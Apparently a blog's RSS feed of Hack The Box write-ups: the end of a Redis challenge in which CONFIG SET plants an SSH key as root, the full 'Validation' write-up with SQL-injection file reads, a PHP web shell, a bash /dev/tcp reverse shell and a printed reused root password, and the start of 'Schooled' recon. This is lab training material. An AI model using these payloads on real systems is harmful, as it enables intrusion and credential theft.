</code></pre></div><p>I can connect to the Redis server using <code>redis-cli</code> without authentication. I started the enumeration by sending <code>INFO</code> command, but under <code># Keyspace</code>, I found no active database.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">user@redlike-a6548218fe17631b-b75878d5-qsl75:/$ which redis-cli
/usr/bin/redis-cli
user@redlike-a6548218fe17631b-b75878d5-qsl75:/$ redis-cli
127.0.0.1:6379&gt; INFO
<span class="c1"># Server</span>
redis_version:5.0.7
redis_git_sha1:00000000
redis_git_dirty:0
redis_build_id:636cde3b5c7a3923
redis_mode:standalone
os:Linux 5.4.120+ x86_64
arch_bits:64
multiplexing_api:epoll
atomicvar_api:atomic-builtin
gcc_version:9.2.1
process_id:15
run_id:f5d6504f95159db85bb78e1bd786b2f3171564fd
tcp_port:6379
uptime_in_seconds:344
uptime_in_days:0
hz:10
configured_hz:10
lru_clock:4575234
executable:/usr/bin/redis-server
config_file:/etc/redis/redis.conf

<span class="c1"># Clients</span>
connected_clients:1
client_recent_max_input_buffer:2
client_recent_max_output_buffer:0
blocked_clients:0

<span class="c1"># Memory</span>
used_memory:859152
used_memory_human:839.02K
used_memory_rss:6017024
used_memory_rss_human:5.74M
used_memory_peak:859152
used_memory_peak_human:839.02K
used_memory_peak_perc:100.12%
used_memory_overhead:845926
used_memory_startup:796232
used_memory_dataset:13226
used_memory_dataset_perc:21.02%
allocator_allocated:1575864
allocator_active:1847296
allocator_resident:9879552
total_system_memory:33678073856
total_system_memory_human:31.37G
used_memory_lua:41984
used_memory_lua_human:41.00K
used_memory_scripts:0
used_memory_scripts_human:0B
number_of_cached_scripts:0
maxmemory:0
maxmemory_human:0B
maxmemory_policy:noeviction
allocator_frag_ratio:1.17
allocator_frag_bytes:271432
allocator_rss_ratio:5.35
allocator_rss_bytes:8032256
rss_overhead_ratio:0.61
rss_overhead_bytes:-3862528
mem_fragmentation_ratio:7.36
mem_fragmentation_bytes:5199880
mem_not_counted_for_evict:0
mem_replication_backlog:0
mem_clients_slaves:0
mem_clients_normal:49694
mem_aof_buffer:0
mem_allocator:jemalloc-5.2.1
active_defrag_running:0
lazyfree_pending_objects:0

<span class="c1"># Persistence</span>
loading:0
rdb_changes_since_last_save:0
rdb_bgsave_in_progress:0
rdb_last_save_time:1631964842
rdb_last_bgsave_status:ok
rdb_last_bgsave_time_sec:-1
rdb_current_bgsave_time_sec:-1
rdb_last_cow_size:0
aof_enabled:0
aof_rewrite_in_progress:0
aof_rewrite_scheduled:0
aof_last_rewrite_time_sec:-1
aof_current_rewrite_time_sec:-1
aof_last_bgrewrite_status:ok
aof_last_write_status:ok
aof_last_cow_size:0

<span class="c1"># Stats</span>
total_connections_received:1
total_commands_processed:1
instantaneous_ops_per_sec:0
total_net_input_bytes:31
total_net_output_bytes:11468
instantaneous_input_kbps:0.00
instantaneous_output_kbps:0.00
rejected_connections:0
sync_full:0
sync_partial_ok:0
sync_partial_err:0
expired_keys:0
expired_stale_perc:0.00
expired_time_cap_reached_count:0
evicted_keys:0
keyspace_hits:0
keyspace_misses:0
pubsub_channels:0
pubsub_patterns:0
latest_fork_usec:0
migrate_cached_sockets:0
slave_expires_tracked_keys:0
active_defrag_hits:0
active_defrag_misses:0
active_defrag_key_hits:0
active_defrag_key_misses:0

<span class="c1"># Replication</span>
role:master
connected_slaves:0
master_replid:f4b741e04432090f4eba3ef1fbdb2ce11e405aeb
master_replid2:0000000000000000000000000000000000000000
master_repl_offset:0
second_repl_offset:-1
repl_backlog_active:0
repl_backlog_size:1048576
repl_backlog_first_byte_offset:0
repl_backlog_histlen:0

<span class="c1"># CPU</span>
used_cpu_sys:0.271186
used_cpu_user:0.278797
used_cpu_sys_children:0.000000
used_cpu_user_children:0.000000

<span class="c1"># Cluster</span>
cluster_enabled:0

<span class="c1"># Keyspace</span>
127.0.0.1:6379&gt;
</code></pre></div><p>The next thing I tried was writing a file to <code>/tmp</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">127.0.0.1:6379&gt; config <span class="nb">set</span> dir /tmp
OK
127.0.0.1:6379&gt; config <span class="nb">set</span> dbfilename choropys.php
OK
127.0.0.1:6379&gt; <span class="nb">set</span> <span class="nb">test</span> <span class="s2">&#34;choropys&#34;</span>
OK
127.0.0.1:6379&gt; save
OK
127.0.0.1:6379&gt;
</code></pre></div><p>I exited from <code>redis-cli</code> and immediately checked the file I wrote under <code>/tmp</code>. It&rsquo;s there and the owner is root!</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">user@redlike-a6548218fe17631b-b75878d5-qsl75:/$ ls -l /tmp/choropys.php
-rw-rw---- <span class="m">1</span> root root <span class="m">112</span> Sep <span class="m">18</span> 11:45 /tmp/choropys.php
</code></pre></div><p>This arbitrary file write lack the execute permissions, but I remember from Hack The Box Postman that it is possible to use this to overwite the SSH <code>authorized_keys</code> file (see <a href="https://0xdf.gitlab.io/2020/03/14/htb-postman.html">this writeup</a> by 0xdf). So I can try to ovewrite the root&rsquo;s <code>authorized_keys</code> file.</p>
<p>First, I need to generate a pair of SSH keys.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">user@redlike-20edff3e85f553f2-55b895664b-szch7:~$ mkdir .ssh
user@redlike-20edff3e85f553f2-55b895664b-szch7:~$ ssh-keygen -t rsa
Generating public/private rsa key pair.
Enter file in which to save the key <span class="o">(</span>/home/user/.ssh/id_rsa<span class="o">)</span>:
Enter passphrase <span class="o">(</span>empty <span class="k">for</span> no passphrase<span class="o">)</span>:
Enter same passphrase again:
Your identification has been saved in /home/user/.ssh/id_rsa
Your public key has been saved in /home/user/.ssh/id_rsa.pub
The key fingerprint is:
SHA256:AVk3h1vdyP/x1KCcBr/IQY7eac9vzZUUrMx/pNkB0KI user@redlike-20edff3e85f553f2-55b895664b-szch7
The key<span class="err">&#39;</span>s randomart image is:
+---<span class="o">[</span>RSA 3072<span class="o">]</span>----+
<span class="p">|</span>      .o. oo+o.o <span class="p">|</span>
<span class="p">|</span>      .. .++.o<span class="o">=</span>o.<span class="p">|</span>
<span class="p">|</span>        .+.*+oooo<span class="p">|</span>
<span class="p">|</span>        .E+ *+ +<span class="o">=</span><span class="p">|</span>
<span class="p">|</span>       .So <span class="o">=</span> .o**<span class="p">|</span>
<span class="p">|</span>        . * . oo*<span class="p">|</span>
<span class="p">|</span>         . o   oo<span class="p">|</span>
<span class="p">|</span>            o . o<span class="p">|</span>
<span class="p">|</span>             o.  <span class="p">|</span>
+----<span class="o">[</span>SHA256<span class="o">]</span>-----+
</code></pre></div><p>Then I will have to wrap the SSH public key with two extra newlines.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">user@redlike-20edff3e85f553f2-55b895664b-szch7:~$ <span class="o">(</span><span class="nb">echo</span> -e <span class="s2">&#34;\n\n&#34;</span><span class="p">;</span> cat ~/.ssh/id_rsa.pub<span class="p">;</span> <span class="nb">echo</span> -e <span class="s2">&#34;\n\n&#34;</span><span class="o">)</span> &gt; spaced_key.txt
</code></pre></div><p>Now the key can be stored in Redis using the following command.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">user@redlike-20edff3e85f553f2-55b895664b-szch7:~$ cat spaced_key.txt <span class="p">|</span> redis-cli -x <span class="nb">set</span> spaced_key.txt
OK
</code></pre></div><p>Then I can just set the database file name to  <code>authorized_keys</code> and save that under <code>/root/.ssh/</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">user@redlike-20edff3e85f553f2-55b895664b-szch7:~$ redis-cli
127.0.0.1:6379&gt; config <span class="nb">set</span> dir /root/.ssh
OK
127.0.0.1:6379&gt; config <span class="nb">set</span> dbfilename <span class="s2">&#34;authorized_keys&#34;</span>
OK
127.0.0.1:6379&gt; save
OK
127.0.0.1:6379&gt;
</code></pre></div><p>And it worked, I can SSH login as root user.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">user@redlike-20edff3e85f553f2-55b895664b-szch7:~$ ssh root@redlike-20edff3e85f553f2-55b895664b-szch7
The authenticity of host <span class="s1">&#39;redlike-20edff3e85f553f2-55b895664b-szch7 (10.112.8.36)&#39;</span> can<span class="s1">&#39;t be established.
</span><span class="s1">ECDSA key fingerprint is SHA256:m9vzgGyWcCXB1tg0uLHYCKCaDNZFUnbeSirAvvLkYxU.
</span><span class="s1">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
</span><span class="s1">Warning: Permanently added &#39;</span>redlike-20edff3e85f553f2-55b895664b-szch7,10.112.8.36<span class="s1">&#39; (ECDSA) to the list of known hosts.
</span><span class="s1">Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.120+ x86_64)
</span><span class="s1">
</span><span class="s1"> * Documentation:  https://help.ubuntu.com
</span><span class="s1"> * Management:     https://landscape.canonical.com
</span><span class="s1"> * Support:        https://ubuntu.com/advantage
</span><span class="s1">
</span><span class="s1">This system has been minimized by removing packages and content that are
</span><span class="s1">not required on a system that users do not log into.
</span><span class="s1">
</span><span class="s1">To restore this content, you can run the &#39;</span>unminimize<span class="err">&#39;</span> command.

The programs included with the Ubuntu system are free software<span class="p">;</span>
the exact distribution terms <span class="k">for</span> each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

root@redlike-20edff3e85f553f2-55b895664b-szch7:~# id
<span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
root@redlike-20edff3e85f553f2-55b895664b-szch7:~# ls -l
total <span class="m">4</span>
--w------- <span class="m">1</span> root root <span class="m">39</span> Sep <span class="m">16</span> 14:43 flag.txt
root@redlike-20edff3e85f553f2-55b895664b-szch7:~# cat flag.txt
flag<span class="o">{</span>69dc14707af23b728ebd1363715ec890<span class="o">}</span>
</code></pre></div>]]></content:encoded>
    </item>
    
    <item>
      <title>HackTheBox - Validation</title>
      <link>https://fahmifj.github.io/hackthebox/validation/</link>
      <pubDate>Fri, 24 Sep 2021 19:11:30 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/hackthebox/validation/</guid>
      <description>Second-order SQL injection</description>
      <content:encoded><![CDATA[<p><a href="https://app.hackthebox.eu/machines/Validation">Validation</a>  is a machine from the UHC September qualifiers and is currently live on Hack The Box as a retired machine. It starts with enumeration on a website and identifying a second order SQL injection. The SQL user can use various SQL functions, two of which allow for file read and file write. The web configuration, which contains database credentials, can be read using the file read ability. With the file write ability and also write permission on the web root, it is possible to drop a web shell to gain a foothold on the system. For the root part, the password for the database is found to be re-used by the root account.</p>
<h4 id="skills-learned">Skills Learned</h4>
<ul>
<li>Web enumeration</li>
<li>SQL injection</li>
</ul>
<h4 id="tools">Tools</h4>
<ul>
<li>Nmap</li>
<li>Burp Suite</li>
</ul>
<h2 id="reconnaissance">Reconnaissance</h2>
<h3 id="nmap">Nmap</h3>
<p>All TCP ports scan with <code>nmap</code> discovers 4 open ports: SSH on 22, three web servers on 80, 4566 (probably LocalStack), and 8080.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «validation» «10.10.14.5» 
$ fscan 10.10.11.116 validation
nmap -p- 10.10.11.116 <span class="p">|</span> grep <span class="s1">&#39;^[0-9]&#39;</span> <span class="p">|</span> cut -d <span class="s1">&#39;/&#39;</span> -f1 <span class="p">|</span> tr <span class="s1">&#39;\n&#39;</span> <span class="s1">&#39;,&#39;</span> <span class="p">|</span> sed <span class="s1">&#39;s/,$//&#39;</span>
nmap -p 22,80,4566,5000,5001,5002,5003,5004,5005,5006,5007,5008,8080 -sC -sV -oA nmap/all-tcp-ports-validation 10.10.11.116
Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-09-22 16:46 EDT
Nmap scan report <span class="k">for</span> 10.10.11.116
Host is up <span class="o">(</span>0.051s latency<span class="o">)</span>.

PORT     STATE    SERVICE        VERSION
22/tcp   open     ssh            OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
<span class="p">|</span> ssh-hostkey: 
<span class="p">|</span>   <span class="m">3072</span> d8:f5:ef:d2:d3:f9:8d:ad:c6:cf:24:85:94:26:ef:7a <span class="o">(</span>RSA<span class="o">)</span>
<span class="p">|</span>   <span class="m">256</span> 46:3d:6b:cb:a8:19:eb:6a:d0:68:86:94:86:73:e1:72 <span class="o">(</span>ECDSA<span class="o">)</span>
<span class="p">|</span>_  <span class="m">256</span> 70:32:d7:e3:77:c1:4a:cf:47:2a:de:e5:08:7a:f8:7a <span class="o">(</span>ED25519<span class="o">)</span>
80/tcp   open     http           Apache httpd 2.4.48 <span class="o">((</span>Debian<span class="o">))</span>
<span class="p">|</span>_http-server-header: Apache/2.4.48 <span class="o">(</span>Debian<span class="o">)</span>
<span class="p">|</span>_http-title: Site doesn<span class="err">&#39;</span>t have a title <span class="o">(</span>text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>UTF-8<span class="o">)</span>.
4566/tcp open     http           nginx
<span class="p">|</span>_http-title: <span class="m">403</span> Forbidden
5000/tcp filtered upnp
5001/tcp filtered commplex-link
5002/tcp filtered rfe
5003/tcp filtered filemaker
5004/tcp filtered avt-profile-1
5005/tcp filtered avt-profile-2
5006/tcp filtered wsm-server
5007/tcp filtered wsm-server-ssl
5008/tcp filtered synapsis-edge
8080/tcp open     http           nginx
<span class="p">|</span>_http-title: <span class="m">502</span> Bad Gateway
Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 16.07 seconds
</code></pre></div><p>The filtered ports indicate that there are some firewall/IP table rules applied on the machine.</p>
<h2 id="enumeration">Enumeration</h2>
<h3 id="tcp-80---website">TCP 80 - Website</h3>
<p>Port 80 presents a registration page of UHC. Adding <code>index.php</code> reveals that it&rsquo;s PHP site.</p>
<p><div class="img-container"><img src="imgs/image-20210923035321832.png" alt="image-20210923035321832"  /></div>
</p>
<p>I can register on it, and it redirects to <code>/account.php</code>. The submitted inputs (country and username) are reflected back here, and this can be an indicator for injection point.</p>
<p><div class="img-container"><img src="imgs/image-20210923040838459.png" alt="image-20210923040838459"  /></div>
</p>
<p>The HTTP request for register, which was previously intercepted using Burp Suite, is as follows:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="nf">POST</span> <span class="nn">/index.php</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="n">Host</span><span class="o">:</span> <span class="l">10.10.11.116</span>
<span class="n">User-Agent</span><span class="o">:</span> <span class="l">Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0</span>
<span class="n">Accept</span><span class="o">:</span> <span class="l">text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span>
<span class="n">Accept-Language</span><span class="o">:</span> <span class="l">en-US,en;q=0.5</span>
<span class="n">Accept-Encoding</span><span class="o">:</span> <span class="l">gzip, deflate</span>
<span class="n">Content-Type</span><span class="o">:</span> <span class="l">application/x-www-form-urlencoded</span>
<span class="n">Content-Length</span><span class="o">:</span> <span class="l">35</span>
<span class="n">Origin</span><span class="o">:</span> <span class="l">http://10.10.11.116</span>
<span class="n">Connection</span><span class="o">:</span> <span class="l">close</span>
<span class="n">Referer</span><span class="o">:</span> <span class="l">http://10.10.11.116/index.php</span>
<span class="n">Upgrade-Insecure-Requests</span><span class="o">:</span> <span class="l">1</span>

username=choropys&amp;country=Indonesia
</code></pre></div><p>And the server responses with <code>302</code> which redirects to <code>/account.php</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">302</span> <span class="ne">Found</span>
<span class="n">Date</span><span class="o">:</span> <span class="l">Wed, 22 Sep 2021 21:08:19 GMT</span>
<span class="n">Server</span><span class="o">:</span> <span class="l">Apache/2.4.48 (Debian)</span>
<span class="n">X-Powered-By</span><span class="o">:</span> <span class="l">PHP/7.4.23</span>
<span class="n">Set-Cookie</span><span class="o">:</span> <span class="l">user=f1bffe3047f1550d765a66e3ac54515c</span>
<span class="n">Location</span><span class="o">:</span> <span class="l">/account.php</span>
<span class="n">Content-Length</span><span class="o">:</span> <span class="l">0</span>
<span class="n">Connection</span><span class="o">:</span> <span class="l">close</span>
<span class="n">Content-Type</span><span class="o">:</span> <span class="l">text/html; charset=UTF-8</span>
</code></pre></div><p>The response also contains a cookie which is <code>md5sum</code> of the username.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «validation» «10.10.14.5» 
$ <span class="nb">echo</span> -n <span class="s1">&#39;choropys&#39;</span> <span class="p">|</span> md5sum                                                                 
f1bffe3047f1550d765a66e3ac54515c
</code></pre></div><h2 id="foothold">Foothold</h2>
<h3 id="sql-injection">SQL injection</h3>
<h4 id="detection">Detection</h4>
<p>I will submit another registration request with the following payload,</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="nf">POST</span> <span class="nn">/index.php</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="n">Host</span><span class="o">:</span> <span class="l">10.10.11.116</span>

<span class="g">...[SNIP]...
</span><span class="g">
</span><span class="g">username=choropys&#39;&amp;country=Indonesia&#39;
</span></code></pre></div><p>Now when I navigate to <code>/account.php</code> with updated cookie, the page displays an error message.</p>
<p><div class="img-container"><img src="imgs/image-20210923041509664.png" alt="image-20210923041509664"  /></div>
</p>
<p>If I search for  <code>fetch_assoc()</code> on Google, it&rsquo;s a PHP function that typically used to handle database records.</p>
<p>Now if I change the <code>country</code>  value to <code>Indonesia' -- #</code> , the page doesn&rsquo;t error out. From here, I can assume that the site is vulnerable to SQL injection.</p>
<p><div class="img-container"><img src="imgs/image-20210923041604118.png" alt="image-20210923041604118"  /></div>
</p>
<p>I will submit <code>country=Indonesia'ORDER BY 1,2 -- #</code> to identify the number of available columns, and the <code>/account.php</code> page returns with the same error.</p>
<p><div class="img-container"><img src="imgs/image-20210923042953130.png" alt="image-20210923042953130"  /></div>
</p>
<p>So the query in the backend only wants a single column.</p>
<h4 id="leak-source">Leak source</h4>
<p>I couldn&rsquo;t find any credentials on the database, but I found out that the MySQL <code>load_file()</code> function isn&rsquo;t restricted. I can read the <code>/etc/passwd</code> file using that function.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">username=choropys&amp;country=&#39;UNION SELECT load_file(&#39;/etc/passwd&#39;) -- #
</code></pre></div><p>When I refresh <code>/account.page</code></p>
<p><div class="img-container"><img src="imgs/image-20210923043603480.png" alt="image-20210923043603480"  /></div>
</p>
<p>Since the location of <code>account.php</code> has been leaked by the error message, I can try to load that file with <code>country='UNION SELECT load_file('/var/www/html/account.php') -- #</code>. When I refresh the <code>account.php</code> page and view its source, the source code of <code>account.php</code> is there, and it also leaks the configuration file.</p>
<p><div class="img-container"><img src="imgs/image-20210923044030733.png" alt="image-20210923044030733"  /></div>
</p>
<p>I can try to read <code>config.php</code> by changing my payload to <code>country='UNION SELECT load_file('/var/www/html/account.php') -- #</code>, and it reveals database credentials.</p>
<p><div class="img-container"><img src="imgs/image-20210923044108761.png" alt="image-20210923044108761"  /></div>
</p>
<p>I will note these creds.</p>
<h3 id="shell-as-www-data">Shell as www-data</h3>
<h4 id="web-shell">Web shell</h4>
<p>I also find that writing files is allowed on <code>/var/www/html/</code>, therefore I could put a web shell there.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">username=choropys&amp;country=&#39;UNION SELECT &#34;&lt;?php system($_REQUEST[c]); ?&gt;&#34; INTO OUTFILE &#34;/var/www/html/chrp.php&#34; -- #	
</code></pre></div><p>And now I have code execution.</p>
<p><div class="img-container"><img src="imgs/image-20210923045051661.png" alt="image-20210923045051661"  /></div>
</p>
<h4 id="reverse-shell">Reverse Shell</h4>
<p>The system does have bash, but my reverse shell doesn&rsquo;t work with the GET method, so I changed the request to use the POST method and URL encode the payload.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">c=/bin/bash+-c+&#34;/bin/bash+-i+&gt;%26+/dev/tcp/10.10.14.5/21+0&gt;%261&#34;
</code></pre></div><p>On my listener</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «validation» «10.10.14.5» 
$ nc -nvlp <span class="m">21</span>                                                
listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">21</span> ...
connect to <span class="o">[</span>10.10.14.5<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.11.116<span class="o">]</span> <span class="m">37096</span>
bash: cannot <span class="nb">set</span> terminal process group <span class="o">(</span>1<span class="o">)</span>: Inappropriate ioctl <span class="k">for</span> device
bash: no job control in this shell
www-data@validation:/var/www/html$ id 
id 
<span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
</code></pre></div><p>I will upgrade my shell.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">www-data@validation:/var/www/html$ which script
which script
/usr/bin/script
www-data@validation:/var/www/html$ script /dev/null -c bash
script /dev/null -c bash
Script started, output log file is <span class="s1">&#39;/dev/null&#39;</span>.
www-data@validation:/var/www/html$ ^Z
<span class="o">[</span>1<span class="o">]</span>  + <span class="m">113</span> suspended  nc -nvlp <span class="m">21</span>
→ root@kali «exploits» «10.10.14.49» 
$ stty raw -echo<span class="p">;</span> <span class="nb">fg</span>
<span class="o">[</span>1<span class="o">]</span>  + <span class="m">113</span> continued  nc -nvlp <span class="m">21</span>

www-data@validation:/var/www/html$ 
</code></pre></div><p>The root flag is readable by others, so I could grab it.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">www-data@validation:/home/htb$ ls -lR /home
/home:
total <span class="m">4</span>
drwxr-xr-x <span class="m">2</span> root root <span class="m">4096</span> Sep <span class="m">9</span> 12:09 htb

/home/htb:
total <span class="m">4</span>
-rw-r--r-- <span class="m">2</span> root root <span class="m">33</span> Sep <span class="m">22</span> 22:14 user.txt
</code></pre></div><p>I also noticed that I&rsquo;m inside a Docker container because there is <code>.dockerenv</code> at the root file system</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">www-data@validation:/$ ls -l .dockerenv
-rwxr-xr-x <span class="m">2</span> root root <span class="m">0</span> Sep <span class="m">16</span> 13:39 .dockerenv
</code></pre></div><h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="shell-as-root">Shell as root</h3>
<h4 id="su-root">su root</h4>
<p>In the previous enumeration using SQLi, I didn&rsquo;t see user <strong>htb</strong> listed in the <code>/etc/passwd</code> file, and it&rsquo;s only <strong>root</strong> that has a login shell. So I tried the database password I obtained from the <code>config.php</code> file on <strong>root</strong>, and it worked.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">www-data@validation:/$ su -   
su -
Password: uhc-9qual-global-pw

root@validation:~# 
</code></pre></div><p>I thought I needed to escape from this container, but when I checked the <code>/root/</code> directory, the root flag was there.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">root@validation:/# ls -l /root/root.txt 
-r-------- <span class="m">2</span> root root <span class="m">33</span> Sep <span class="m">22</span> 22:14 root.txt
</code></pre></div><p>I also briefly thought that maybe a player had left a copy of the root flag of the host in this container. But, after I watched the <a href="https://www.youtube.com/watch?v=UqoVQ4dbYaI">official walkthrough</a> video by ippsec and read the <a href="https://0xdf.gitlab.io/2021/09/14/htb-validation.html">writeup</a> by 0xdf, the box ended this way 😅.</p>
]]></content:encoded>
    </item>
    
    <item>
      <title>HackTheBox - Schooled</title>
      <link>https://fahmifj.github.io/hackthebox/schooled/</link>
      <pubDate>Thu, 16 Sep 2021 18:22:05 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/hackthebox/schooled/</guid>
      <description>Moodle exploitation using CVEs</description>
      <content:encoded><![CDATA[<p>Schooled features an instance of Moodle, a popular LMS used by many school institutions. The installed Moodle version is vulnerable to stored XSS in MoodleNet Profile (CVE-2020-25627) and role privilege escalation (CVE-2020-14321). Exploiting the XSS allows me to login as a teacher. The teacher role can be escalated to a manager role to get the site administration capability, thus allowing me to install a malicious plugin to gain interactive shell access to the system. Internal enumeration reveals database credentials which can be used to recover a password from the database. The password is reused by one of the users for SSH login. This user is allowed to install FreeBSD packages with <code>sudo</code> permissions, and it can be exploited to gain root access.</p>
<h4 id="skills-learned">Skills Learned</h4>
<ul>
<li>Stealing cookie with XSS</li>
<li>Moodle exploitation</li>
<li>Sudo exploitation on <code>pkg</code></li>
</ul>
<h4 id="tools">Tools</h4>
<ul>
<li>Nmap</li>
<li>Burp Suite</li>
</ul>
<h2 id="reconnaissance">Reconnaissance</h2>
<h3 id="nmap">Nmap</h3>
<p>A full scan with nmap discovers three open ports: SSH on 22, an Apache web server on port 80 and a service that <code>nmap</code> identifies it as mysqlx.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «schooled» «10.10.14.49» 
$ nmap -p- --max-rate <span class="m">1000</span> -sV --reason -oA nmap/10-tcp-allport-schooled 10.10.10.234
Starting Nmap 7.80 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-05-17 14:34 EDT
Nmap scan report <span class="k">for</span> 10.10.10.234
Host is up, received reset ttl <span class="m">63</span> <span class="o">(</span>0.045s latency<span class="o">)</span>.
Not shown: <span class="m">65532</span> closed ports
Reason: <span class="m">65532</span> resets
PORT      STATE SERVICE REASON         VERSION
22/tcp    open  ssh     syn-ack ttl <span class="m">63</span> OpenSSH 7.9 <span class="o">(</span>FreeBSD 20200214<span class="p">;</span> protocol 2.0<span class="o">)</span>
80/tcp    open  http    syn-ack ttl <span class="m">63</span> Apache httpd 2.4.46 <span class="o">((</span>FreeBSD<span class="o">)</span> PHP/7.4.15<span class="o">)</span>
33060/tcp open  mysqlx? syn-ack ttl <span class="m">63</span>
<span class="m">1</span> service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port33060-TCP:V<span class="o">=</span>7.80%I<span class="o">=</span>7%D<span class="o">=</span>5/17%Time<span class="o">=</span>60A2BA63%P<span class="o">=</span>x86_64-pc-linux-gnu%r<span class="o">(</span>N
...<span class="o">[</span>SNIP<span class="o">]</span>...
Service Info: OS: FreeBSD<span class="p">;</span> CPE: cpe:/o:freebsd:freebsd

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 801.40 seconds
</code></pre></div><h2 id="enumeration">Enumeration</h2>
<h3 id="tcp-80---schooledhtb">TCP 80 - schooled.htb</h3>
<p>Port 80 serving a homepage of a school institution.</p>
<p><div class="img-container"><img src="imgs/image-20210518035709619.png" alt="image-20210518035709619"  /></div>
</p>
<p>In the About section, it states that this school has an online learning system using Moodle.</p>
<p><div class="img-container"><img src="imgs/image-20210518041407775.png" alt="image-20210518041407775"  /></div>
</p>
<p>The Teachers section displays the teachers of the school. This can be useful for generating username list.</p>
<p><div class="img-container"><img src="imgs/image-20210518035931687.png" alt="image-20210518035931687"  /></div>
</p>
<p>On the Contact section, there is an input form. The form submit button points to <code>/contact.php</code>, but it returns with 404.</p>
<p>At the bottom of the site, it reveals an email address and a domain name: <code>schooled.htb</code>.</p>
<p><div class="img-container"><img src="imgs/image-20210518035750397.png" alt="image-20210518035750397"  /></div>
</p>
<p>I will update my <code>/etc/hosts</code> with that domain name.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «schooled» «10.10.14.49» 
$ <span class="nb">echo</span> <span class="s1">&#39;10.10.10.237 schooled.htb&#39;</span> &gt;&gt; /etc/hosts/
</code></pre></div><p>Poking back the site with <code>curl</code> using its domain name reveals that it&rsquo;s the same site.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «schooled» «10.10.14.49» 
$  curl -s http://10.10.10.234/ <span class="p">|</span> wc -c
<span class="m">20750</span>
→ root@kali «schooled» «10.10.14.49» 
$ curl -s http://schooled.htb/ <span class="p">|</span> wc -c
<span class="m">20750</span>
</code></pre></div><h3 id="subdomain-fuzz">Subdomain Fuzz</h3>
<p>Enumerating subdomain using <code>gobuster</code> reveals that there is one called <code>moodle.schooled.htb</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «schooled» «10.10.14.49» 
$ gobuster vhost -u <span class="s1">&#39;http://schooled.htb/&#39;</span> -w /opt/SecLists/Discovery/DNS/subdomains-top1million-110000.txt
